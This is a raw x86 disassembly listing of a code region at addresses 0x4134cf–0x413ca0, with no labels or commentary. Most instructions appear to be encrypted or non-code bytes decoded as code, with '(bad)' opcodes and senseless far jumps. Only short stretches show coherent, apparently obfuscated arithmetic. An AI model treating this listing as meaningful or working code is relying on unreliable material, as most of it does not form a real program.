  4134cf:	rcr    BYTE PTR [edx],1
  4134d1:	mov    esp,0xb6daed20
  4134d6:	out    dx,al
  4134d7:	loope  0x413472
  4134d9:	pop    ebx
  4134da:	xor    ah,BYTE PTR ds:0xd3c2caa9
  4134e0:	xchg   edi,eax
  4134e1:	ror    DWORD PTR [edi-0x2a],0x15
  4134e5:	ins    BYTE PTR es:[edi],dx
  4134e6:	rcr    DWORD PTR [edi+0x3b73e7b],0xd
  4134ed:	retf   
  4134ee:	and    eax,0x358dbc77
  4134f3:	add    eax,0x89b4ba05
  4134f8:	add    BYTE PTR [ecx+0x58],dh
  4134fb:	jmp    0x8837:0x36f64d14
  413502:	popa   
  413503:	rcr    al,1
  413505:	jno    0x413576
  413507:	sub    eax,0xb7b30234
  41350c:	mov    ds:0x72d5bf40,eax
  413511:	ins    DWORD PTR es:[edi],dx
  413512:	cmp    DWORD PTR [esi+0x5d63f036],edi
  413518:	pop    ss
  413519:	adc    dh,dl
  41351b:	mov    cl,0x8d
  41351d:	or     eax,0xe546423c
  413522:	inc    eax
  413523:	ret    0x1ff0
  413526:	aad    0x9d
  413528:	adc    al,0xce
  41352a:	lea    ebx,[esi-0x46]
  41352d:	push   ebx
  41352e:	push   es
  41352f:	jo     0x413594
  413531:	sbb    cl,ah
  413533:	fmul   QWORD PTR [eax+edi*4]
  413536:	jbe    0x413576
  413538:	inc    edx
  413539:	jae    0x413565
  41353b:	adc    ch,dl
  41353d:	adc    dl,BYTE PTR [eax]
  41353f:	sar    DWORD PTR ds:0x92df01ee,cl
  413545:	push   0x3d1091b2
  41354a:	aaa    
  41354b:	out    dx,al
  41354c:	stos   DWORD PTR es:[edi],eax
  41354d:	iret   
  41354e:	sbb    eax,0x23357778
  413553:	mov    dh,0xfb
  413555:	adc    bl,al
  413557:	jle    0x41358a
  413559:	mov    edi,0xb2d3abf5
  41355e:	mov    edi,eax
  413560:	and    al,0x15
  413562:	add    BYTE PTR [ecx-0x6d],bl
  413565:	mov    ebp,0xb52b9f97
  41356a:	fsub   DWORD PTR ds:0x7f2e872
  413570:	ret    
  413571:	mov    ebx,0x37261158
  413576:	cmp    al,BYTE PTR [ebp+0x55afdf5]
  41357c:	inc    ebx
  41357d:	sahf   
  41357e:	cmp    ecx,DWORD PTR [esp+esi*4]
  413581:	hlt    
  413582:	out    dx,al
  413583:	fwait
  413584:	cmc    
  413585:	adc    eax,ebp
  413587:	es xchg edx,eax
  413589:	add    DWORD PTR [esi+0x56],ebx
  41358c:	inc    esp
  41358d:	mov    BYTE PTR [ebx-0x61a5624c],bh
  413593:	or     dl,0x49
  413596:	outs   dx,BYTE PTR ds:[esi]
  413597:	push   cs
  413598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413599:	ja     0x413582
  41359b:	inc    esp
  41359c:	mov    WORD PTR [edi],cs
  41359e:	xor    ah,BYTE PTR [esi-0x614a38bf]
  4135a4:	sub    edx,DWORD PTR [esi-0x45]
  4135a7:	xchg   edx,eax
  4135a8:	test   DWORD PTR [edi+0x7e],esi
  4135ab:	sbb    bl,ah
  4135ad:	xor    BYTE PTR [edi+0x35],dl
  4135b0:	retf   0xbc77
  4135b3:	sub    eax,0xd7e61e62
  4135b8:	dec    esp
  4135b9:	in     eax,dx
  4135ba:	cmp    BYTE PTR [ecx+0x39],bh
  4135bd:	in     eax,dx
  4135be:	pop    ebp
  4135bf:	push   cs
  4135c0:	xor    eax,0x38fa7a7c
  4135c5:	clc    
  4135c6:	xchg   DWORD PTR [di+0x2f69],ebp
  4135cb:	enter  0x51e5,0x78
  4135cf:	test   al,0xef
  4135d1:	pop    ss
  4135d2:	pop    ebx
  4135d3:	lock pusha 
  4135d5:	cdq    
  4135d6:	inc    ebp
  4135d7:	push   es
  4135d8:	or     al,0xf
  4135da:	push   esi
  4135db:	mov    ah,0x1
  4135dd:	aas    
  4135de:	(bad)  
  4135e0:	push   ebp
  4135e1:	loopne 0x4135b1
  4135e3:	scas   eax,DWORD PTR es:[edi]
  4135e4:	(bad)  
  4135e5:	lds    ebp,FWORD PTR [ebx+0x4f]
  4135e8:	xor    DWORD PTR [edx+0x2a074b58],esp
  4135ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135ef:	mov    ah,0xf
  4135f1:	jbe    0x41357a
  4135f3:	jne    0x413605
  4135f5:	sub    BYTE PTR [esi-0x2ec706f6],dl
  4135fb:	mov    WORD PTR [ebp+0x1565bd4],?
  413601:	push   DWORD PTR fs:[edx]
  413604:	cli    
  413605:	dec    edx
  413607:	add    DWORD PTR [ecx-0x22],ebp
  41360a:	xor    dh,BYTE PTR [edx+0x77]
  41360d:	add    cl,BYTE PTR ds:0x9e6c86dc
  413613:	pusha  
  413614:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413615:	imul   esp,DWORD PTR [ebx-0x554239d1],0xc0bb0476
  41361f:	in     al,dx
  413620:	cs je  0x413695
  413623:	push   edx
  413624:	test   eax,0x68a1bbcd
  413629:	in     al,dx
  41362a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41362b:	jns    0x4135d3
  41362d:	dec    ebx
  41362e:	inc    edi
  41362f:	pop    edi
  413630:	imul   dh
  413632:	or     DWORD PTR [ebp-0x2b7acfc4],ebp
  413638:	sbb    BYTE PTR [edi],bl
  41363a:	(bad)  
  41363b:	rol    dh,cl
  41363d:	add    edi,0xfa7c051c
  413643:	pop    ds
  413644:	retf   0xffcc
  413647:	mov    al,ds:0xb0d216d1
  41364c:	imul   edi,DWORD PTR [ebp-0x40],0xfd2f934c
  413653:	jnp    0x4135e3
  413655:	inc    edi
  413656:	(bad)  
  413657:	sti    
  413658:	ins    BYTE PTR es:[edi],dx
  413659:	xor    ebp,ebx
  41365b:	test   esi,0x614f1dbe
  413661:	in     al,0x6e
  413663:	lahf   
  413664:	stc    
  413665:	jmp    0x5de94a90
  41366a:	mov    cl,0x2a
  41366c:	loop   0x41369f
  41366e:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  413670:	sbb    al,0xeb
  413672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413673:	pop    edi
  413674:	out    dx,al
  413675:	xor    BYTE PTR [ecx],dh
  413677:	dec    edi
  413678:	sub    eax,0x86d826f0
  41367d:	cmp    BYTE PTR cs:[ecx-0x7bbce117],ah
  413684:	leave  
  413685:	cmp    al,0x8f
  413687:	and    DWORD PTR [edx+0x20],ecx
  41368a:	xchg   edx,eax
  41368b:	xor    edx,DWORD PTR [edi-0x18]
  41368e:	mov    cl,0xdc
  413690:	outs   dx,DWORD PTR ds:[esi]
  413691:	sbb    edx,DWORD PTR [ebp+0x183a4935]
  413697:	call   0x4e39a54a
  41369c:	fcmovne st,st(2)
  41369e:	ins    DWORD PTR es:[edi],dx
  41369f:	and    dl,0x5e
  4136a2:	add    ah,BYTE PTR [edx+0x31]
  4136a5:	and    al,al
  4136a7:	sbb    DWORD PTR [edx+0x5ae9c643],esi
  4136ad:	mov    edi,DWORD PTR [ecx+0x37d1200d]
  4136b3:	(bad)  
  4136b4:	and    al,0x76
  4136b6:	stos   DWORD PTR es:[edi],eax
  4136b7:	js     0x4136db
  4136b9:	fwait
  4136ba:	xchg   DWORD PTR [ebp+0x5f],edx
  4136bd:	push   esi
  4136be:	outs   dx,BYTE PTR ds:[esi]
  4136bf:	js     0x4136fd
  4136c1:	dec    ecx
  4136c2:	aad    0x14
  4136c4:	ja     0x41369e
  4136c6:	les    ebp,FWORD PTR [ebx-0x6a]
  4136c9:	jl     0x413663
  4136cb:	lock push cs
  4136cd:	cmp    BYTE PTR ds:0x8f4baf27,0x8b
  4136d4:	push   ebp
  4136d5:	mov    esp,0x33f47d8b
  4136da:	shl    BYTE PTR [ebx],1
  4136dc:	clc    
  4136dd:	add    edx,ecx
  4136df:	add    edi,ecx
  4136e1:	jmp    0x413969
  4136e6:	ror    ecx,0xc2
  4136e9:	ror    dl,0xc7
  4136ec:	leave  
  4136ed:	leave  
  4136ee:	mov    ?,WORD PTR [ebp+0x524c7219]
  4136f4:	imul   esi,DWORD PTR [edi],0x787f7d28
  4136fa:	in     eax,0x7e
  4136fc:	js     0x413776
  4136fe:	aad    0x74
  413700:	gs xchg esi,eax
  413702:	test   DWORD PTR [edx],edi
  413704:	mov    dh,0x7d
  413706:	push   edx
  413707:	push   ebp
  413708:	stc    
  413709:	adc    eax,ebp
  41370b:	mov    eax,fs:0x9aa720cc
  413711:	in     eax,dx
  413712:	inc    esi
  413713:	loope  0x41375e
  413715:	aas    
  413716:	sub    ecx,DWORD PTR [edi]
  413718:	aam    0x30
  41371a:	sbb    DWORD PTR [ebp+ecx*2-0x13],esp
  41371e:	sub    cl,BYTE PTR ds:0x43ec7379
  413724:	retf   
  413725:	cdq    
  413726:	ds mov ah,0x97
  413729:	push   edi
  41372a:	dec    esi
  41372b:	or     dh,0x31
  41372e:	jecxz  0x413740
  413730:	jmp    0x4137a9
  413732:	push   esp
  413733:	adc    DWORD PTR [eax],ecx
  413735:	mov    dh,0x17
  413737:	xchg   ebx,eax
  413738:	mov    al,ds:0x5ba42dcd
  41373d:	pop    es
  41373e:	mov    edi,0xcb086488
  413743:	daa    
  413744:	xor    ebx,DWORD PTR [ecx-0x3]
  413747:	pop    edx
  413748:	pop    ebp
  413749:	cs and al,0x3f
  41374c:	mov    eax,edx
  41374e:	call   0xe0d2:0xb2dd3819
  413755:	adc    ah,cl
  413757:	push   ax
  413759:	and    eax,0xa10428e0
  41375e:	pop    ss
  41375f:	in     al,dx
  413760:	jmp    0x4137c1
  413762:	aas    
  413763:	xor    dl,BYTE PTR [edx]
  413765:	adc    BYTE PTR [ebx+0x3475821],cl
  41376b:	and    al,0x89
  41376d:	push   eax
  41376e:	fdivr  QWORD PTR [ebp-0x59ff39b6]
  413774:	pop    ds
  413775:	jb     0x4137ef
  413777:	mov    ds:0xae291e57,eax
  41377c:	sbb    edi,DWORD PTR [ebx]
  41377e:	inc    eax
  41377f:	mov    edx,0xea5388a7
  413784:	imul   ebx,DWORD PTR [esi],0x1c
  413787:	out    0x89,al
  413789:	inc    ecx
  41378a:	sub    dl,BYTE PTR [edx]
  41378c:	sub    BYTE PTR ds:0xf7b82f0c,bh
  413792:	enter  0x885e,0xd1
  413796:	add    eax,0x5002a77a
  41379b:	dec    ebp
  41379c:	push   edx
  41379d:	and    al,0xf6
  41379f:	imul   ebx,DWORD PTR [eax+ecx*1],0xbd548f21
  4137a6:	loop   0x4137a2
  4137a8:	sti    
  4137a9:	sub    esi,DWORD PTR [edx-0x30]
  4137ac:	ins    BYTE PTR es:[edi],dx
  4137ad:	jge    0x413791
  4137af:	test   al,0xe7
  4137b1:	dec    ecx
  4137b2:	ja     0x4137c1
  4137b4:	shr    BYTE PTR [esi],0x37
  4137b7:	pusha  
  4137b8:	pop    es
  4137b9:	pop    ebx
  4137ba:	mov    edi,0x42d93c5e
  4137bf:	pop    ds
  4137c0:	mov    esp,ebp
  4137c2:	cwde   
  4137c3:	stos   DWORD PTR es:[edi],eax
  4137c4:	lds    ecx,FWORD PTR [ebp+0x3b]
  4137c7:	cmp    bh,BYTE PTR [edx-0x2f3ab704]
  4137cd:	ret    
  4137ce:	pop    eax
  4137cf:	rol    edx,1
  4137d1:	mov    ch,0xa3
  4137d3:	cmp    cl,bl
  4137d5:	sub    ebx,esi
  4137d7:	daa    
  4137d8:	retf   0xf248
  4137db:	stc    
  4137dc:	cmp    bl,0x81
  4137df:	xchg   esp,eax
  4137e0:	push   ecx
  4137e1:	fcom   DWORD PTR [eax]
  4137e3:	mov    ebx,0x73aa0e9d
  4137e8:	xor    bh,0x65
  4137eb:	dec    ebp
  4137ec:	cmp    ebp,esp
  4137ee:	in     al,0xb4
  4137f0:	adc    eax,0xdddd740e
  4137f5:	cmp    edx,0x3c69676c
  4137fb:	mov    eax,0x7cd62fb4
  413800:	or     BYTE PTR [esi+0x3feaea76],0x54
  413807:	or     DWORD PTR [esp+esi*4-0x5fbc7e6d],esi
  41380e:	mov    dx,WORD PTR [ebx+ebx*4-0x42]
  413813:	cld    
  413814:	clc    
  413815:	cmp    DWORD PTR [ecx+0x5f97c982],0xb825f68d
  41381f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413820:	jb     0x4137d4
  413822:	mov    BYTE PTR [esi+0x662749cc],ch
  413828:	xchg   edx,eax
  413829:	pop    ss
  41382a:	cmp    ah,BYTE PTR [edx-0x29e9a99e]
  413830:	fs jecxz 0x4137c2
  413833:	mov    gs,esp
  413835:	adc    cl,bh
  413837:	jmp    0x4137c8
  413839:	mov    bh,0xb0
  41383b:	mov    ebx,0x6c9521c
  413840:	out    dx,eax
  413841:	(bad)  
  413843:	dec    eax
  413844:	daa    
  413845:	repnz xor bl,al
  413848:	les    ecx,FWORD PTR [eax-0x55]
  41384b:	shr    DWORD PTR [edi+0x36d8c02b],cl
  413851:	in     eax,0x32
  413853:	mov    eax,0xf49e7c5f
  413858:	call   0xa1d4:0x3f2add4d
  41385f:	add    BYTE PTR ds:0x3d05102a,bh
  413865:	lods   eax,DWORD PTR ds:[esi]
  413866:	mov    bh,0xdc
  413868:	daa    
  413869:	pop    ss
  41386a:	and    dl,BYTE PTR [ebp+0x3c6f4c9e]
  413870:	xor    ch,cl
  413872:	mov    ?,WORD PTR [ecx+0x75]
  413875:	std    
  413876:	cmc    
  413877:	test   al,0x4d
  413879:	cs pop ss
  41387b:	stos   DWORD PTR es:[edi],eax
  41387c:	add    eax,DWORD PTR [eax+ebp*2-0x4d]
  413880:	fimul  DWORD PTR ds:0x22bc0f31
  413886:	jg     0x4138c8
  413888:	cmp    eax,0x8d7d0cc2
  41388d:	loope  0x4138c6
  41388f:	hlt    
  413890:	imul   esp,DWORD PTR [edi],0xd3fdac4d
  413896:	ss xchg edi,eax
  413898:	xchg   ecx,eax
  413899:	mov    esi,0x250ca6e6
  41389e:	cli    
  41389f:	inc    ebp
  4138a0:	js     0x413887
  4138a2:	lods   al,BYTE PTR ds:[esi]
  4138a3:	test   al,0xdd
  4138a5:	mov    al,0x84
  4138a7:	cmp    dl,BYTE PTR [edx+edi*4-0x608febe]
  4138ae:	push   edi
  4138af:	push   es
  4138b0:	mov    dl,0x5e
  4138b2:	mov    eax,0x54a70676
  4138b7:	cmp    al,dl
  4138b9:	push   ebx
  4138ba:	xchg   ebx,eax
  4138bb:	shl    BYTE PTR [edi-0x74],0x8b
  4138bf:	push   cs
  4138c0:	sub    eax,0xf50f02a1
  4138c5:	sub    DWORD PTR [eax-0x72],edi
  4138c8:	pop    esp
  4138c9:	mov    bh,0x48
  4138cb:	xchg   BYTE PTR [esi+0x65],ch
  4138ce:	and    DWORD PTR [edi],esp
  4138d0:	lea    ebx,[esi-0xc1b6570]
  4138d6:	(bad)  
  4138d7:	(bad)  [ecx+0x5212b966]
  4138dd:	ret    
  4138de:	shr    eax,cl
  4138e0:	out    0x62,eax
  4138e2:	or     edx,esp
  4138e4:	ins    BYTE PTR es:[edi],dx
  4138e5:	sbb    ch,dl
  4138e7:	test   al,0xd2
  4138e9:	(bad)  
  4138eb:	je     0x41390a
  4138ed:	nop
  4138ee:	jns    0x413909
  4138f0:	mov    ds:0x4ff436d5,al
  4138f5:	mov    al,ds:0xc4a977c3
  4138fa:	or     ch,BYTE PTR [ebx+0x42ddddba]
  413900:	sbb    al,0xc5
  413902:	fdiv   QWORD PTR [esi]
  413904:	jne    0x4138b0
  413906:	fcom   QWORD PTR [edi+0x374ef620]
  41390c:	and    dh,BYTE PTR ds:0x30dab3b5
  413912:	cmp    al,0x5f
  413914:	mov    bh,0xc9
  413916:	pop    ds
  413917:	icebp  
  413918:	push   es
  413919:	pop    esp
  41391a:	(bad)  
  41391b:	loopne 0x4138e0
  41391d:	cmp    eax,0xde531bc2
  413922:	retf   0xbb54
  413925:	mov    bh,0x27
  413927:	lea    ebx,[edx]
  413929:	dec    ebx
  41392a:	sub    BYTE PTR [edx+eax*1-0x71f7514d],dl
  413931:	ins    DWORD PTR es:[edi],dx
  413932:	pop    ebp
  413933:	test   eax,0x69dc8889
  413938:	outs   dx,BYTE PTR ds:[esi]
  413939:	push   ecx
  41393a:	mov    ah,0x59
  41393c:	pop    ecx
  41393d:	daa    
  41393e:	xchg   DWORD PTR [esi-0x7a],ecx
  413941:	imul   DWORD PTR [ecx-0x52]
  413944:	cmp    ax,0xeb41
  413948:	scas   al,BYTE PTR es:[edi]
  413949:	and    eax,DWORD PTR [ecx-0x66]
  41394c:	add    ebx,DWORD PTR [ebx]
  41394e:	add    esp,DWORD PTR [eax-0x6cf85f32]
  413954:	lods   al,BYTE PTR ds:[esi]
  413955:	out    0xf6,eax
  413957:	or     DWORD PTR [ecx-0x4a18857a],0x40
  41395e:	scas   al,BYTE PTR es:[edi]
  41395f:	je     0x41397d
  413961:	xchg   edi,eax
  413962:	pop    ds
  413963:	jae    0x4139d8
  413965:	jg     0x41398d
  413967:	leave  
  413968:	ret    
  413969:	imul   edx,edi
  41396c:	add    edx,DWORD PTR [ebp-0x14]
  41396f:	mov    DWORD PTR [ebp-0x14],edx
  413972:	mov    edx,DWORD PTR [ebp-0xc]
  413975:	mov    edi,DWORD PTR [ebp-0x24]
  413978:	xor    edx,eax
  41397a:	add    edx,ecx
  41397c:	imul   edx,edi
  41397f:	mov    edi,DWORD PTR [ebp-0xc]
  413982:	xor    edi,eax
  413984:	jmp    0x413c0c
  413989:	enter  0xc4cf,0xca
  41398d:	retf   
  41398e:	fxch   st(6)
  413990:	fld    DWORD PTR [edx]
  413992:	xchg   edx,eax
  413993:	(bad)  
  413994:	loope  0x4139af
  413996:	int3   
  413997:	out    dx,eax
  413998:	cmp    al,0x95
  41399a:	add    edi,DWORD PTR [edi+0x78]
  41399d:	in     eax,0x7e
  41399f:	js     0x413a19
  4139a1:	jmp    0xb2d7:0xd9142665
  4139a8:	xor    ebx,esp
  4139aa:	cli    
  4139ab:	js     0x4139cf
  4139ad:	dec    ecx
  4139ae:	retf   0xd81e
  4139b1:	push   esi
  4139b2:	shl    dh,1
  4139b4:	bswap  esi
  4139b6:	sub    al,ch
  4139b8:	sub    ebx,ecx
  4139ba:	(bad)  
  4139bb:	sbb    BYTE PTR [ecx],bh
  4139bd:	or     DWORD PTR [ecx+0x1b],ebp
  4139c0:	pushf  
  4139c1:	mov    ah,0x7e
  4139c3:	repnz cdq 
  4139c5:	call   0x1073:0xad5ee7fb
  4139cc:	outs   dx,DWORD PTR ds:[esi]
  4139cd:	pop    edi
  4139ce:	jo     0x413a2c
  4139d0:	adc    al,0x91
  4139d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139d3:	push   edx
  4139d4:	jmp    0x775c:0xfd42f8dd
  4139db:	or     eax,0xf3aefe7d
  4139e0:	inc    edx
  4139e1:	retf   0xaaf7
  4139e4:	inc    eax
  4139e5:	jecxz  0x413a25
  4139e7:	data16 and ah,ah
  4139ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139eb:	(bad)  
  4139ec:	cmc    
  4139ed:	xchg   DWORD PTR [eax+0x4beed98d],esp
  4139f3:	sbb    ah,dh
  4139f5:	xchg   ebx,eax
  4139f6:	in     al,dx
  4139f7:	mov    ah,0x70
  4139f9:	add    eax,0xddd199af
  4139fe:	mov    ebp,0x89c727ad
  413a03:	bound  ecx,QWORD PTR [edx]
  413a05:	mov    ebp,0x8ee70056
  413a0a:	add    BYTE PTR [edi+0x7d615e0a],dh
  413a10:	xchg   ebx,eax
  413a11:	jno    0x413a65
  413a13:	xchg   ebp,eax
  413a14:	fist   DWORD PTR [ecx+0x5f]
  413a17:	sahf   
  413a18:	fdivr  DWORD PTR [eax]
  413a1a:	ja     0x4139a0
  413a1c:	pop    eax
  413a1d:	inc    esp
  413a1e:	sub    dh,bl
  413a20:	outs   dx,BYTE PTR ds:[esi]
  413a21:	(bad)  
  413a22:	sar    DWORD PTR [edi-0x80],1
  413a25:	xchg   edx,eax
  413a26:	ret    0x2175
  413a29:	aad    0xc2
  413a2b:	stc    
  413a2c:	ins    BYTE PTR es:[edi],dx
  413a2d:	sub    cl,BYTE PTR [edx+0x63]
  413a30:	cld    
  413a31:	in     al,0xed
  413a33:	xchg   ecx,eax
  413a34:	retf   0x840f
  413a37:	mov    ds:0x3f2443fd,eax
  413a3c:	xlat   BYTE PTR ds:[ebx]
  413a3d:	leave  
  413a3e:	(bad)  
  413a3f:	sahf   
  413a40:	cmp    al,0xe8
  413a43:	pusha  
  413a44:	add    BYTE PTR [esi],bl
  413a46:	pop    ebx
  413a47:	sub    al,0x26
  413a49:	fadd   st(4),st
  413a4b:	imul   esp,edi,0x5a8d510
  413a51:	xor    BYTE PTR [edx+0x25],cl
  413a54:	sbb    DWORD PTR [ebx],ebx
  413a56:	icebp  
  413a57:	scas   al,BYTE PTR es:[edi]
  413a58:	and    dl,BYTE PTR [esi-0x468ebe3e]
  413a5e:	sbb    eax,0x70e5075
  413a63:	xor    DWORD PTR [edi+eiz*4+0x18],edi
  413a67:	xlat   BYTE PTR ds:[ebx]
  413a68:	fdivr  st,st(7)
  413a6a:	pushf  
  413a6b:	sub    al,0xf2
  413a6d:	push   cs
  413a6e:	cmc    
  413a6f:	test   eax,0xfbf5cefa
  413a74:	lods   al,BYTE PTR ds:[esi]
  413a75:	adc    ebx,DWORD PTR [ebp+0xf9f2f0d]
  413a7b:	push   ebp
  413a7c:	popa   
  413a7d:	xor    DWORD PTR [edx+eax*8+0x35],eax
  413a81:	xor    al,0x2b
  413a83:	fimul  WORD PTR ds:0x58f1e7c6
  413a89:	lea    ecx,[ecx+edx*2]
  413a8c:	adc    bh,BYTE PTR [edi+0x760c59ff]
  413a92:	icebp  
  413a93:	xor    cl,BYTE PTR [esi+0x757fadc2]
  413a99:	jecxz  0x413a81
  413a9b:	in     al,0xe4
  413a9d:	dec    esp
  413a9e:	mov    eax,0x7e941ac
  413aa3:	enter  0x618d,0x9a
  413aa7:	xor    ecx,DWORD PTR [edi+0x347bf9a3]
  413aad:	pop    edx
  413aae:	pop    ds
  413aaf:	and    BYTE PTR [ecx],ch
  413ab1:	dec    eax
  413ab2:	pop    edx
  413ab3:	adc    cl,dh
  413ab5:	or     al,0x28
  413ab7:	movhps xmm5,QWORD PTR [ebp+eiz*4+0x60]
  413abc:	les    esi,FWORD PTR [ebx-0x5d]
  413abf:	push   eax
  413ac0:	xor    eax,0x123d7110
  413ac5:	pop    esp
  413ac6:	mov    ebp,0x3d3795e2
  413acb:	js     0x413b26
  413acd:	repz pop esi
  413acf:	mov    esp,0x3492c4c4
  413ad4:	lds    ebp,FWORD PTR [edi]
  413ad6:	ficomp WORD PTR [eax-0x6b]
  413ad9:	rcr    edi,cl
  413adb:	je     0x413b0b
  413add:	out    dx,al
  413ade:	push   0x1b9801d8
  413ae3:	es push ebp
  413ae5:	push   ecx
  413ae6:	ret    0xe21a
  413ae9:	ds in  al,dx
  413aeb:	push   edi
  413aec:	daa    
  413aed:	xor    DWORD PTR [esi+0x4fd0137e],ebp
  413af3:	pop    ebx
  413af4:	ret    
  413af5:	jecxz  0x413b36
  413af7:	pop    eax
  413af8:	jb     0x413b73
  413afa:	dec    edi
  413afb:	aad    0xf0
  413afd:	xor    BYTE PTR [esi],bl
  413aff:	loop   0x413a8f
  413b01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b02:	int    0x1b
  413b04:	cmp    esp,DWORD PTR [edx]
  413b06:	pusha  
  413b07:	xchg   edi,eax
  413b08:	and    ebp,esi
  413b0a:	jo     0x413ad3
  413b0c:	inc    ebp
  413b0d:	xor    eax,0x8f1a93f6
  413b12:	jecxz  0x413b93
  413b14:	jmp    0x8e9558e7
  413b19:	cli    
  413b1a:	pusha  
  413b1b:	mov    edx,0x6cb8a97a
  413b20:	es out dx,eax
  413b22:	xlat   BYTE PTR ds:[ebx]
  413b23:	mov    eax,0x660b539e
  413b28:	test   DWORD PTR [ebp+0xe86fde4],0xf7b0ec8a
  413b32:	loope  0x413b98
  413b34:	lods   eax,DWORD PTR ds:[esi]
  413b35:	loop   0x413b3c
  413b37:	aaa    
  413b38:	mov    ecx,0x844c8998
  413b3d:	cmp    eax,0xeef4fde7
  413b42:	and    ebp,edx
  413b44:	and    DWORD PTR [edi+0x76],ecx
  413b47:	mov    edx,0x9e698378
  413b4c:	pop    edi
  413b4d:	add    DWORD PTR [ebx],ecx
  413b4f:	ret    0xa1cd
  413b52:	pop    ecx
  413b53:	sub    DWORD PTR [esi],edx
  413b55:	or     DWORD PTR [ecx],edi
  413b57:	in     eax,dx
  413b58:	xchg   ebp,eax
  413b59:	jb     0x413b9e
  413b5b:	push   ecx
  413b5c:	loopne 0x413ae6
  413b5e:	pop    ebx
  413b5f:	nop
  413b60:	inc    ebx
  413b61:	dec    edx
  413b62:	push   esi
  413b63:	mov    cl,0x39
  413b65:	test   esp,0x636aca53
  413b6b:	lods   eax,DWORD PTR ds:[esi]
  413b6c:	mov    WORD PTR ds:0xb4738fb8,?
  413b72:	mov    al,0xd5
  413b74:	jb     0x413bd1
  413b76:	xor    DWORD PTR gs:[eax+0x3916c8dd],ebx
  413b7d:	jmp    0xf98e09f9
  413b82:	imul   edi,DWORD PTR [eax+0x19e16db9],0xffffffcf
  413b89:	mov    esp,0xf10c9da7
  413b8e:	or     al,bh
  413b90:	pop    ss
  413b91:	out    0x8a,eax
  413b93:	cmp    eax,0x469fe7c9
  413b98:	jne    0x413bfc
  413b9a:	iret   
  413b9b:	push   ebp
  413b9c:	outs   dx,BYTE PTR ds:[esi]
  413b9d:	lahf   
  413b9e:	shl    BYTE PTR [esi-0x71],cl
  413ba1:	mov    esp,0x586dc3a4
  413ba6:	lock push esi
  413ba8:	hlt    
  413ba9:	dec    ecx
  413baa:	adc    esi,DWORD PTR [esi+edx*4]
  413bad:	mov    al,ds:0x35f21e39
  413bb2:	push   ds
  413bb3:	and    al,0xa
  413bb5:	rcl    DWORD PTR [eax+eiz*8-0x318b4f78],0xcc
  413bbd:	fstp   st(5)
  413bbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bc0:	or     BYTE PTR [esi+0x2d],bl
  413bc3:	xchg   edx,eax
  413bc4:	push   esp
  413bc5:	and    DWORD PTR [ebp+0xe],esp
  413bc8:	lock in eax,dx
  413bca:	xlat   BYTE PTR ds:[ebx]
  413bcb:	dec    eax
  413bcc:	jnp    0x413c39
  413bce:	push   edi
  413bcf:	push   0xffffffe9
  413bd1:	sub    al,0x63
  413bd3:	call   0xa595:0x37ead276
  413bda:	cmp    BYTE PTR [ebp+0x64f0d5c1],0xcd
  413be1:	inc    eax
  413be2:	push   esi
  413be3:	repnz dec ecx
  413be5:	cwde   
  413be6:	dec    edx
  413be7:	retf   0xf0d9
  413bea:	adc    al,0x8e
  413bec:	add    al,0x1b
  413bee:	xchg   esp,eax
  413bef:	dec    ecx
  413bf0:	dec    esi
  413bf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bf2:	jl     0x413c25
  413bf4:	lds    eax,FWORD PTR [ebp-0x7d]
  413bf7:	(bad)  
  413bf9:	mov    ds:0xa3aa0c24,al
  413bfe:	mov    dh,0x31
  413c00:	sub    al,0x10
  413c02:	nop
  413c03:	inc    ebp
  413c04:	pop    esi
  413c05:	inc    ebp
  413c06:	sub    al,0x8
  413c08:	mov    edx,0x2b0e33ce
  413c0d:	xlat   BYTE PTR ds:[ebx]
  413c0e:	mov    edi,DWORD PTR [ebp-0xc]
  413c11:	mov    ebx,DWORD PTR [ebp-0x14]
  413c14:	xor    edi,eax
  413c16:	add    edi,ecx
  413c18:	jmp    0x413ea0
  413c1d:	(bad)  
  413c1e:	ror    al,cl
  413c20:	iret   
  413c21:	aam    0xd1
  413c23:	(bad)
  413c26:	ins    DWORD PTR es:[edi],dx
  413c27:	js     0x413c82
  413c29:	sub    esi,esp
  413c2b:	fs int3 
  413c2d:	add    al,BYTE PTR [eax]
  413c2f:	jg     0x413ca9
  413c31:	in     eax,0x7e
  413c33:	js     0x413cad
  413c35:	adc    eax,0xe547479d
  413c3a:	leave  
  413c3b:	mov    WORD PTR [edx-0x45],es
  413c3e:	sub    edi,edi
  413c40:	lea    ebx,[edx+0xc]
  413c43:	inc    ebx
  413c44:	scas   al,BYTE PTR es:[edi]
  413c45:	jne    0x413c60
  413c47:	and    esp,DWORD PTR [ecx-0x4379c30a]
  413c4d:	ret    
  413c4e:	int    0x20
  413c50:	mov    WORD PTR [eax+0x71c467cf],ds
  413c56:	test   al,0xb6
  413c58:	sbb    ecx,0xfffffffe
  413c5b:	nop
  413c5c:	ffree  st(3)
  413c5e:	daa    
  413c5f:	imul   eax,DWORD PTR [edi-0x71bedefb],0xfffffffb
  413c66:	cmp    cl,BYTE PTR [ecx]
  413c68:	push   esp
  413c69:	imul   eax,esp,0xf2f6fb90
  413c6f:	or     DWORD PTR [edx+0x6f],esp
  413c72:	mov    cl,0xdb
  413c74:	mov    edi,0xf2c727d5
  413c79:	inc    esp
  413c7a:	pushf  
  413c7b:	das    
  413c7c:	mov    dl,0x81
  413c7e:	adc    al,0xcc
  413c80:	mov    bh,0x88
  413c82:	and    DWORD PTR [edi+0x5eca94d1],ebp
  413c88:	daa    
  413c89:	mov    esp,DWORD PTR [esi]
  413c8b:	test   BYTE PTR [ebx+0x6],ah
  413c8e:	arpl   sp,sp
  413c90:	and    DWORD PTR [ebx-0x56ea6ecb],0xffffff89
  413c97:	adc    al,0x81
  413c99:	sbb    esi,DWORD PTR [ebp+0x13902432]
  413c9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ca0:	push   ds
